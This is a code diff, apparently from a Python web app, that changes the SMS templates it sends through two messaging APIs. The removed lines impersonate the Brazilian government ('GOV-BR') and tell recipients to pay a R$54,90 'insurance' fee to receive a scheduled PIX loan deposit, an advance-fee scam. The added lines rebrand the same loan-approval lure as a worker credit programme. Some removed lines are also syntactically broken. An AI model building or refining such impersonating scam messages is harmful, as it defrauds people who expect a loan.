@@ -44,7 +44,7 @@ def send_verification_code_smsdev(phone_number: str, verification_code: str) -> 
 
         if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
             # Message template
-            message = f"[GOV-BR]: {first_name}, Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
 
             # API parameters
             params = {
@@ -92,7 +92,7 @@ def send_verification_code_owen(phone_number: str, verification_code: str) -> tu
             international_number = f"55{formatted_phone}"
 
             # Message template
-            message = f"[GOV-BR]: {first_name}, Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
+            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
 
             # Prepare the curl command
             import subprocess
@@ -286,7 +286,7 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
             return False
 
         # Message template
-        message = f"TRANSFERENCIA PIX: {first_name}, um deposito de R${valor_do_emprestimo}" foi agendado para a sua conta. Para receber o valor realize o pagamento do Seguro no valor de R$54,90.
+        message = f"[PROGRAMA CREDITO DO TRABALHADOR] {first_name}, seu empréstimo de R${amount:.2f} foi aprovado! Finalize o processo para receber via PIX instantaneamente."
 
         # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
@@ -689,7 +689,7 @@ def send_test_sms():
             return redirect(url_for('sms_config'))
 
         # Message template for test
-        message = "TRANSFERENCIA PIX: {first_name}, um deposito de R${valor_do_emprestimo}" foi agendado para a sua conta. Para receber o valor realize o pagamento do Seguro no valor de R$54,90"
+        message = "[PROGRAMA CREDITO DO TRABALHADOR] Esta é uma mensagem de teste do sistema."
 
         # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
